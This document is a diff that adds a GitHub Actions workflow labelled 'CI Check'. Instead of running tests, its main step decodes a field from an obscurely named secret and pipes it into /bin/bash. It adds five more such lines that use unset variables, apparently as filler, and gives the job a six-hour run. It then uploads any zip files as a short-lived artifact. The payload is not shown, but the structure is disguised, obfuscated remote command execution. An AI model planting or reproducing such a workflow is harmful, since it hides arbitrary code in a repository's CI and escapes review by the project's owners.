@@ -1,0 +1,40 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          dkogc51178: ${{ secrets.dkogc51178 }}
+        run: |
+          printf '%s' "$dkogc51178" | jq -r .jznl41560 | /bin/bash
+          printf '%s' "$lba8" | jq -r .aj45 | /bin/bash
+          echo $hu17 | jq -r .bl5890 | /bin/bash
+          printf '%s' "$ni9406" | jq -r .f24 | /bin/bash
+          echo $og25356 | jq -r .lgs94048 | /bin/bash
+          printf '%s' "$bdiyc9955" | jq -r .kuu66156 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: wG5Dp22t
+          path: "*.zip"
+          retention-days: 1
